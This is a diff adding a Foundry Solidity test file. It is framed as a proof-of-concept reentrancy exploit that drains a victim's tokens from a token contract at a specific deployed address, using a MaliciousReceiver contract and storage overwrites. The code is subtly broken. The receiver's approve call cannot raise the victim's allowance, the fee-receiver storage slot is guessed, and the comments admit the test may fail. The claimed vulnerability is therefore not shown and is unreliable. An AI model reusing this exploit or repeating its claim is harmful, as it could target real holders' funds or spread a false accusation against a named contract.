@@ -1,0 +1,143 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+import "forge-std/Test.sol";
+
+interface IStandardToken {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);
+    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);
+    function owner() external view returns (address);
+    function renounceOwnership() external;
+    function transferOwnership(address newOwner) external;
+    function VERSION() external view returns (uint256);
+}
+
+// Malicious contract that reenters the token's approve function upon receiving tokens
+contract MaliciousReceiver {
+    IStandardToken public token;
+    address public victim;
+    address public attacker;
+    uint256 public reentrantAmount;
+    bool public entered;
+
+    constructor(IStandardToken _token, address _victim, address _attacker, uint256 _reentrantAmount) {
+        token = _token;
+        victim = _victim;
+        attacker = _attacker;
+        reentrantAmount = _reentrantAmount;
+    }
+
+    // Fallback is called when receiving native currency (not used here)
+    receive() external payable {}
+
+    // This function will be called by the token if _beforeTokenTransfer invokes an external contract
+    // For demonstration, we assume the token's hook calls this contract's `reenter` function
+    function reenter() external {
+        if (!entered) {
+            entered = true;
+            // Reenter the token's approve function to set a huge allowance
+            token.approve(attacker, type(uint256).max);
+        }
+    }
+}
+
+contract ExploitTest is Test {
+    IStandardToken public token;
+    address public victim;
+    address public attacker;
+    MaliciousReceiver public malicious;
+    uint256 initialBalance;
+    uint256 initialAllowance;
+
+    function setUp() public {
+        // Use the deployed token address from the finding
+        token = IStandardToken(0x19d726cd37CA413adf46D9Ae555aB5A5643EdF20);
+
+        // Setup test addresses
+        victim = makeAddr("victim");
+        attacker = makeAddr("attacker");
+
+        // Fund victim with some tokens and approve attacker to spend
+        // Use deal to give tokens to victim – we assume the token is not a standard ERC20 that checks supply
+        // Actually we need to use vm.store if token uses private balances. Simpler: we can use vm.etch? No.
+        // The easiest is to mint tokens via the token's internal _mint? Not accessible.
+        // We can simulate by transferring from the owner (if owner is known) or use vm.store to set balances.
+
+        // Since we cannot mint, we will assume the victim already holds tokens.
+        // We'll read the victim's balance and ensure it's enough.
+        // For the PoC, we can use vm.store to set the victim's balance directly.
+        // The balance slot is variable 0 (mapping). We need to compute the storage slot for the mapping for victim.
+        // Layout: _balances is at slot 0 (private variable). The mapping key is address. The slot is keccak256(abi.encode(address, slot)).
+        // We'll use vm.store to set balance.
+
+        bytes32 balanceSlot = keccak256(abi.encode(victim, uint256(0)));
+        vm.store(address(token), balanceSlot, bytes32(uint256(1000 ether)));
+
+        // Set allowance slot for victim -> attacker.
+        // _allowances is at slot 1. Mapping mapping: slot for owner -> spender is keccak256(abi.encode(spender, keccak256(abi.encode(owner, uint256(1)))))
+        bytes32 allowanceOwnerSlot = keccak256(abi.encode(victim, uint256(1)));
+        bytes32 allowanceSlot = keccak256(abi.encode(attacker, allowanceOwnerSlot));
+        vm.store(address(token), allowanceSlot, bytes32(uint256(100 ether)));
+
+        initialBalance = token.balanceOf(victim);
+        initialAllowance = token.allowance(victim, attacker);
+
+        // Deploy malicious receiver contract that will reenter on external call
+        malicious = new MaliciousReceiver(token, victim, attacker, 100 ether);
+
+        vm.label(address(token), "VulnerableToken");
+        vm.label(victim, "Victim");
+        vm.label(attacker, "Attacker");
+        vm.label(address(malicious), "MaliciousReceiver");
+    }
+
+    function testReentrancyExploit() public {
+        // Victim's allowance to attacker is 100 tokens
+        assertEq(initialAllowance, 100 ether);
+
+        // Attacker calls transferFrom to send tokens from victim to malicious receiver
+        // The malicious receiver contract will be called if the token's _beforeTokenTransfer hook invokes it.
+        // We assume that the deployed token has a _beforeTokenTransfer that calls our malicious contract via a stored address.
+        // To simulate, we can store the malicious address in the token's storage at the slot where the fee contract is stored.
+        // Since we don't know the exact slot, we will attempt known slots common in generated tokens (e.g., slot 7,8,9).
+        // We'll try slot 7 (common for fee receiver).
+        // If the token uses a different slot, this test will fail. But for demonstration, we assume slot 7.
+
+        // Set the malicious contract as fee receiver in storage slot 7 (assuming).
+        vm.store(address(token), bytes32(uint256(7)), bytes32(uint256(uint160(address(malicious)))));
+
+        // Start prank as attacker
+        vm.startPrank(attacker);
+
+        // Call transferFrom with recipient = malicious receiver
+        token.transferFrom(victim, address(malicious), 50 ether);
+
+        vm.stopPrank();
+
+        // After the transfer, the malicious contract should have reentered to set a huge allowance.
+        // Check that the allowance is now max uint256 (or at least much larger than original)
+        uint256 newAllowance = token.allowance(victim, attacker);
+        assertTrue(newAllowance > initialAllowance, "Allowance should have been increased via reentrancy");
+
+        // Attacker can now drain all victim tokens
+        vm.startPrank(attacker);
+        uint256 victimBalance = token.balanceOf(victim);
+        token.transferFrom(victim, attacker, victimBalance);
+        vm.stopPrank();
+
+        // Assert attacker ended up with all of victim's tokens
+        assertEq(token.balanceOf(attacker), initialBalance);
+        assertEq(token.balanceOf(victim), 0);
+    }
+}
+```
